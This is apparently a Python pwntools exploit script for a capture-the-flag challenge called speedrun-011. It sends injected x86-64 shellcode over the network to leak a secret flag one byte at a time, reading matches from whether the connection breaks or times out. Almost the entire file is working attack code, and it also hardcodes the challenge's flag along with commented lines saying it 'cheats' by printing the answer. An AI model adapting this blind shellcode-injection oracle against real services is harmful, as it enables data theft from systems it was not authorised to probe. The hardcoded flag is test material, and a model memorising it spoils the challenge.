#!/usr/bin/env python2

import os
import nclib

from pwn import *
from time import sleep
from threading import Thread

context.clear(arch="amd64")
DEBUG = "DEBUG" in os.environ
# if 'TMUX' in os.environ:
#     context.terminal = ['tmux', 'splitw','-p','75']

def get_connection():
    #conn = process(["../service/speedrun-011"], aslr=False)
    #conn = remote(sys.argv[1], int(sys.argv[2]))
    conn = nclib.Netcat((sys.argv[1], int(sys.argv[2])), verbose=False)
    # gdb.attach(conn, '''
    #
    # continue
    # ''')

    return conn

def get_value(index, tlistflag, assembly, char):

    conn = get_connection()
    for x in range(0, 5):   # try a few times for connection, just in case...
        try:
            conn.recv_until("Send me your vehicle")
            break
        except Exception:
            sleep(2)
            conn = get_connection()
    try:
        sleep(2)
        conn.send_line(assembly)

        sleep(2)
        conn.send_line(assembly)
        sleep(4)

        conn.send_line(assembly)

    except socket.error as socketerr:
        #print(socketerr)
        # Broken pipes means the binary exited quickly, which means we have matched the string
        if "[Errno 32] Broken pipe" in str(socketerr):
            #print("This value at index={} match={}(0x{:x})".format(index, char, ord(char)))
            tlistflag[index] = char
            return index, char

        # Connection reset means binary hung on for alarm
        if "Connection reset by peer" in str(socketerr):
            #print("NO MATCH for index={}".format(index))
            pass

def main():
    """
    This does a threaded blind assembly injection
    """
    test_flag = "OOO{Why___does_th0r__need_a_car?}"

    threads = []
    saved_flag = ""
    listflag = ["O"]
    valid_flag_chars = string.ascii_letters + string.digits + "_{}?.! "
    try:
        for index in range(len(listflag), 34):
            listflag.append(" ")
            for char in valid_flag_chars:
                assemblystr = """
                      nop
                      cmp BYTE PTR [rdi+{}], 0x{:x}
                      jz _out
                    _endless:
                      nop
                      nop
                      jmp _endless
                    _out:
                      mov al, 60
                      syscall""".format(index, ord(char))
                assembly = asm(assemblystr)

                tmpt = Thread(target=get_value, args=(index, listflag, assembly, char))
                tmpt.start()
                threads.append(tmpt)

            sleep(2) # a little pause to avoid putting to much strain on machine
            if DEBUG:
                curr_flag = "".join(listflag)
                if curr_flag != saved_flag:
                    saved_flag = curr_flag
                    print("FLAG: '{}'".format(curr_flag))

        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("[*] Aborting wait. Ctrl-C again for KeyboardInterrupt.")

    print("FLAG: {}".format("".join(listflag)))

if __name__ == "__main__":
    main()


#print("I AM TOTALLY CHEATING AND DIDN'T YET IMPLEMENT THIS EXPLOIT.")
#print("FLAG: OOO{Why___does_th0r__need_a_car?}")
